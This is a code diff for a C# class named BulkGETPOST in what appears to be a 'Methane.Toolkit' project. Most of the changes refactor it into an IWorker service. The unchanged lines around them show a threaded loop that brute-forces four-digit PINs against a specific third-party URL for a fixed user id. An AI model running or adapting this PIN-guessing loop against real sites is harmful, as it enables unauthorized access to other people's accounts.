@@ -10,7 +10,7 @@ using Methane.Toolkit;
 
 namespace Methane.Toolkit
 {
-    public class BulkGETPOST
+    public class BulkGETPOST : IWorker
     {
         readonly UniUI.IUniUI UI;
         public BulkGETPOST(UniUI.IUniUI ui)
@@ -18,14 +18,25 @@ namespace Methane.Toolkit
             UI = ui;
         }
 
-
+        public BulkGETPOST()
+        {
+            UI = new UniUI.NoUI();
+        }
 
         string cookie = "";
         readonly string bl = "";
 
+        void IWorker.PromptParameters()
+        {
+        }
+
+        void IWorker.BuildFromParameters()
+        {
+        }
 
 
-        public void Run()
+
+        public void RunService()
         {
 
             UI.Log("");
@@ -78,13 +89,16 @@ namespace Methane.Toolkit
         private bool FoundPass = false;
         private string result;
         public int runningThreads = 0;
+
+        IWorkerType IWorker.WorkerType => IWorkerType.Service;
+
         public void ThrURLPass(object obj)
         {
             int passI = (int)obj;
 
             for (int i = passI; i < passI + 100; i++)
             {
-                TryAgain:
+            TryAgain:
                 string pass = i.ToString("0000");
                 //string resp = GetForm($@"https://getlinks.info/love/verifypin.php?userid=sgafizb&pwd={pass}");
                 string resp = GetForm($@"https://getlinks.info/love/verifypin.php?userid=sgafizb&pwd={pass}");
@@ -246,6 +260,7 @@ namespace Methane.Toolkit
         }
 
 
+       
     }
 
 }
